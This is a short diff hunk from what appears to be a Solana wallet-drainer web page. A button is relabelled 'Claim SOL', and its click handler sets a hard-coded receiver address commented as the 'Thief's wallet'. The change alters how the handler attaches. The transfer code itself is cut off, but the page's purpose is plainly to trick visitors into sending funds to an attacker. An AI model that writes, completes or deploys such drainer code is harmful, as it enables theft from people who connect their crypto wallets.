@@ -34,7 +34,7 @@ alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PE
               
 
                 $('#connect-wallet').text("Claim SOL");
-                $('#connect-wallet').off('click').on('click', async () => {
+                $('#connect-wallet').on('click', async () => {
                     try {
                         const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF'); 
                         // Thief's wallet
